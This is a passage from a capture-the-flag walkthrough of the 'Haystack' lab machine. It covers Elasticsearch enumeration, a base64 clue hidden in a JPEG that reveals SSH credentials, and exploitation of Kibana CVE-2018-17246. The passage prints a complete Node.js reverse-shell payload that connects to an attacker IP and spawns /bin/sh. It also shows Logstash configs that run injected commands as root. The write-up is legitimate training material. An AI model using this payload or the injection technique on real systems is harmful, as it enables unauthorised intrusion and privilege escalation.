      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"account"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"44"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"account_number"</span><span class="p">:</span><span class="w"> </span><span class="mi">44</span><span class="p">,</span><span class="w">
          </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="mi">34487</span><span class="p">,</span><span class="w">
          </span><span class="nl">"firstname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Aurelia"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"lastname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Harding"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">37</span><span class="p">,</span><span class="w">
          </span><span class="nl">"gender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"M"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"502 Baycliff Terrace"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"employer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Orbalix"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"aureliaharding@orbalix.com"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"city"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Yardville"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"DE"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"account"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"99"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"account_number"</span><span class="p">:</span><span class="w"> </span><span class="mi">99</span><span class="p">,</span><span class="w">
          </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="mi">47159</span><span class="p">,</span><span class="w">
          </span><span class="nl">"firstname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ratliff"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"lastname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Heath"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">39</span><span class="p">,</span><span class="w">
          </span><span class="nl">"gender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"F"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"806 Rockwell Place"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"employer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Zappix"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ratliffheath@zappix.com"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"city"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Shaft"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ND"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"account"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"119"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"account_number"</span><span class="p">:</span><span class="w"> </span><span class="mi">119</span><span class="p">,</span><span class="w">
          </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="mi">49222</span><span class="p">,</span><span class="w">
          </span><span class="nl">"firstname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Laverne"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"lastname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Johnson"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">28</span><span class="p">,</span><span class="w">
          </span><span class="nl">"gender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"F"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"302 Howard Place"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"employer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Senmei"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lavernejohnson@senmei.com"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"city"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Herlong"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"DC"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"account"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"126"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"account_number"</span><span class="p">:</span><span class="w"> </span><span class="mi">126</span><span class="p">,</span><span class="w">
          </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="mi">3607</span><span class="p">,</span><span class="w">
          </span><span class="nl">"firstname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Effie"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"lastname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Gates"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">39</span><span class="p">,</span><span class="w">
          </span><span class="nl">"gender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"F"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"620 National Drive"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"employer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Digitalus"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"effiegates@digitalus.com"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"city"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Blodgett"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"MD"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"account"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"145"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"account_number"</span><span class="p">:</span><span class="w"> </span><span class="mi">145</span><span class="p">,</span><span class="w">
          </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="mi">47406</span><span class="p">,</span><span class="w">
          </span><span class="nl">"firstname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Rowena"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"lastname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Wilkinson"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w">
          </span><span class="nl">"gender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"M"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"891 Elton Street"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"employer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Asimiline"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rowenawilkinson@asimiline.com"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"city"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ripley"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"NH"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"account"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"183"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"account_number"</span><span class="p">:</span><span class="w"> </span><span class="mi">183</span><span class="p">,</span><span class="w">
          </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="mi">14223</span><span class="p">,</span><span class="w">
          </span><span class="nl">"firstname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Hudson"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"lastname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"English"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">26</span><span class="p">,</span><span class="w">
          </span><span class="nl">"gender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"F"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"823 Herkimer Place"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"employer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Xinware"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hudsonenglish@xinware.com"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"city"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Robbins"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ND"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"account"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"190"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"account_number"</span><span class="p">:</span><span class="w"> </span><span class="mi">190</span><span class="p">,</span><span class="w">
          </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="mi">3150</span><span class="p">,</span><span class="w">
          </span><span class="nl">"firstname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Blake"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"lastname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Davidson"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">30</span><span class="p">,</span><span class="w">
          </span><span class="nl">"gender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"F"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"636 Diamond Street"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"employer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Quantasis"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"blakedavidson@quantasis.com"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"city"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Crumpler"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"KY"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"account"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"208"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"account_number"</span><span class="p">:</span><span class="w"> </span><span class="mi">208</span><span class="p">,</span><span class="w">
          </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="mi">40760</span><span class="p">,</span><span class="w">
          </span><span class="nl">"firstname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Garcia"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"lastname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Hess"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">26</span><span class="p">,</span><span class="w">
          </span><span class="nl">"gender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"F"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"810 Nostrand Avenue"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"employer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Quiltigen"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"garciahess@quiltigen.com"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"city"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Brooktrails"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"GA"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span></code></pre></figure><p>Using <code class="language-plaintext highlighter-rouge">curl -XGET "10.10.10.115:9200/bank/"</code> will show the format of the “bank” index. And we can do the same for “.kibana”, which might be a little more interesting. But honestly, I didn’t see anything in either which was really useful unless you’re a spammer just collecting email addresses. If we knew what ALL the indexes are, then maybe we could find something better.</p><p>Use <code class="language-plaintext highlighter-rouge">curl -XGET "10.10.10.115:9200/_cat/indices?v"</code> to find out what the indexes are:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali /root/htb/haystack                                                                                               
⚡ curl -XGET "10.10.10.115:9200/_cat/indices?v"
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb</code></pre></figure><p>And you can get the structure of them all by using <code class="language-plaintext highlighter-rouge">curl -XGET "10.10.10.115:9200/*/"</code> .</p><p>After playing with submitting queries, my favorite way to submit them is on the URI like… <code class="language-plaintext highlighter-rouge">curl -XGET "10.10.10.115:9200/bank/_search/?pretty=true&amp;q=web*"</code> … where the “q=” is the search string.</p><p>While searching around in the data, I found this bit of encouragement to know I’m on the right track:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali /root/htb/haystack                                                                                               
⚡ curl -XGET "10.10.10.115:9200/quotes/quote/2/_source?pretty=true"
{
  "quote" : "There's a needle in this haystack, you have to search for it"
}</code></pre></figure><p>After a while of trying different searches like <code class="language-plaintext highlighter-rouge">curl -XGET “10.10.10.115:9200/_search?pretty=true&amp;q=needle”</code> and getting nowhere fast, I decided to reassess where I was at in the challenge. Normally when I’m stuck that’s because I’m overlooking something that I should have paid closer attention to. Along with the help of a hint from a forum post that said the picture wasn’t actually useless, I was able to find another clue.</p><p>I downloaded the image of the needle from the port 80 website, and ran a “file” check on it to see if anything odd stood out.</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali /root/Downloads                           
⚡ file needle.jpg                                
needle.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF i
mage data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=paint.net 4.1.1], baseline,
 precision 8, 1200x803, components 3
 </code></pre></figure><p>Nothing out of the ordinary there, so then I printed out the data with “cat”, hoping there might be a hidden string in the padding at the end of the file. That’s a pretty common stegonography trick with JPEG files. Sure enough there was! It was a base64 encoded string. So I extracted it and decoded it:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali /root/Downloads                                                                                                  
⚡ cat needle.jpg | tail -c 45 | base64 -d
la aguja en el pajar es "clave"                                                                                           </code></pre></figure><p>Google Translate tells me this is Spanish for:</p><p><code class="language-plaintext highlighter-rouge">the needle in the haystack is "key"</code></p><p>Great! We can query elasticsearch for that and hopefully get somewhere…</p><p>My first query was for “key”, but that only returned a couple bank accounts that weren’t helpful. So then I searched for “clave” and got two hits that looked good:</p><p>“Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=” which has a base64 string that decodes to “pass: spanish.is.key”.</p><p>And “Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg ” which has another base64 string that decodes to “user: security”.</p><p>Bingo! This should be the login to the SSH server.</p><p> </p><h2 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Getting into the SSH with our found credentials gives access to the user flag</p><p>Looking at the process list shows that there are some processes running under the users “kibana” and “elasticsearch”. There was an exploit found early in the recon phase that affects kibana for our version on this box, it just wasn’t usable for the first stage.</p><p>Earlier when we tried to attack kibana it said we were barking up the wrong tree…</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">[security@haystack ~]$ curl "localhost:9200/api/console/api_server?"
{"error":{"root_cause":[{"type":"index_not_found_exception","reason":"no such index","resource.type":"index_expression","resource.id":"api","index_uuid":"_na_","index":"api"}],"type":"index_not_found_exception","reason":"no such index","resource.type":"index_expression","resource.id":"api","index_uuid":"_na_","index":"api"},"status":404}[security@haystack ~]$ </code></pre></figure><p>…but if the same query is used against the local interface for kibana, we get a different kind of result:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">[security@haystack ~]$ curl "localhost:5601/api/console/api_server?"
{"statusCode":400,"error":"Bad Request","message":"\"apis\" is a required param."}[security@haystack ~]$</code></pre></figure><p>…suggesting we may be able to use the exploit afterall.</p><p>At first I tried to run the <a href="https://github.com/mpgn/CVE-2018-17246">exploit code</a> from within the ssh session, but got no results. Then I looked at the forum for just a page or two and there were several hints that seemed to suggest setting up an SSH tunnel to access the 5601 port remotely. So I read up on some <a href="https://hackernoon.com/the-ssh-black-magic-for-data-science-acd6f65e8528">tutorials</a> for SSH Tunneling since it is kinda confusing. I got the tunnel built with <code class="language-plaintext highlighter-rouge">ssh -L 5601:localhost:5601 security@10.10.10.115</code> and proved the connection worked by sending one of the previous commands from my box:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali /root/Downloads                            
⚡ curl -XGET "localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis="
{"statusCode":400,"error":"Bad Request","message":"\"apis\" is a required param."}</code></pre></figure><p>At that point we can even open the Kibana app in the browser.<br /> <a href="/assets/img/2019/10/2019-10-03_10h34_08.png"><img class="alignnone wp-image-363 size-large" data-src="/assets/img/2019/10/2019-10-03_10h34_08.png" data-proofer-ignore></a></p><p>But what we really want is to run the exploit and get a reverse shell.</p><p><img class="alignnone wp-image-366 size-full" data-src="/assets/img/2019/10/2019-10-03_10h55_54.png" data-proofer-ignore></p><p>The above screenshot shows a tunnel connection where I created the <a href="https://github.com/mpgn/CVE-2018-17246">payload</a> file “shellb.js”, and it shows the exploit command being sent to my tunneled port, and finally it shows the reverse connected shell on the left =).</p><p>The kibana payload file:</p><figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">net</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="dl">"</span><span class="s2">/bin/sh</span><span class="dl">"</span><span class="p">,</span> <span class="p">[]);</span>
    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="dl">"</span><span class="s2">10.10.14.142</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application form crashing</span>
<span class="p">})();</span></code></pre></figure><p>One caveat about the exploit though, if the reverse shell breaks, you may need to rename the payload file before sending the exploit again.</p><p>Set up the PTY for the shell once you are in (makes things a little easier)…<br /> <img class="alignnone size-full wp-image-367" data-src="/assets/img/2019/10/2019-10-03_11h14_55.png" data-proofer-ignore></p><p>I like to make the prompt better, but that’s just me…<br /> <img class="alignnone wp-image-368 size-full" data-src="/assets/img/2019/10/2019-10-03_11h16_35.png" data-proofer-ignore></p><p>Also, while playing with the prompt I goofed on a command and saw something interesting…<br /> <img class="alignnone size-full wp-image-369" data-src="/assets/img/2019/10/2019-10-03_11h13_13.png" data-proofer-ignore></p><p>Lol, Spanish sure is key!</p><p>Anyway, we can search for files we have access to with <span class="lang:zsh decode:true crayon-inline">find / -group kibana</span> .  You’ll notice that we have access to configuration files to something called “logstash” as well. Logstash is another piece of software from elasticsearch, but this one collects and processes input instead of output like kibana.</p><p>There were a few files that seemed interesting:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">[kibana@haystack conf.d]$  ls
filter.conf  input.conf  output.conf
[kibana@haystack conf.d]$  cat filter.conf
filter {
        if [type] == "execute" {
                grok {
                        match =&amp;gt; { "message" =&amp;gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
[kibana@haystack conf.d]$  cat input.conf
input {
    file {
        path =&amp;gt; "/opt/kibana/logstash_*"
        start_position =&amp;gt; "beginning"
        sincedb_path =&amp;gt; "/dev/null"
        stat_interval =&amp;gt; "10 second"
        type =&amp;gt; "execute"
        mode =&amp;gt; "read"
    }
}
[kibana@haystack conf.d]$ cat output.conf
output {
    if [type] == "execute" {
        stdout { codec =&amp;gt; json }
        exec {
            command =&amp;gt; "%{comando} &amp;"
        }
    }
}</code></pre></figure><p>It looks like there could be command injection (type == “execute”) in the output.conf and filter.conf codes.</p><p>I read some basic info pages on the <a href="https://www.elastic.co/guide/en/logstash/current/config-examples.html">config</a> files and I believe how it works is as follows:<br /> Our data is defined by the input{} block and given certain attributes such as its type. The data is then processed by the filter{} block. Within the filter block, the grok{} routine uses a special parser called Grok to extract symbolic meaning out of the general text string, in this case “comando”. The results of the filter{} processing is piped to the output{} block for sending to the operating system through files, stdout, or in our case, shell execution.</p><p>According to the <a href="https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html#plugins-inputs-file-stat_interval">stat_interval</a> setting, the file input should be read every 10 seconds and executed if it grew in size.</p><blockquote><p>Discovering new files and checking whether they have grown/or shrunk occurs in a loop. This loop will sleep for <code class="literal">stat_interval</code> seconds before looping again. However, if files have grown, the new content is read and lines are enqueued. Reading and enqueuing across all grown files can take time, especially if the pipeline is congested. So the overall loop time is a combination of the <code class="literal">stat_interval</code> and the file read time.</p></blockquote><p>Creating a file “/opt/kibana/logstash_a” should fit the input{} block of the config file.</p><p>Writing “Ejecutar comando: echo test” should fit the grok filter{} block. This can be tested with the Grok Debugger in the Web App we have access to now.</p><p>Looking at the process list we can see the logstash process is running as root, so if we it can connect out to a reverse shell, we’ll get root!</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">[security@haystack tmp]$ ps -aux |grep logstash
root       6194  1.1 13.3 2738240 515912 ?      SNsl 07:20   3:54 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash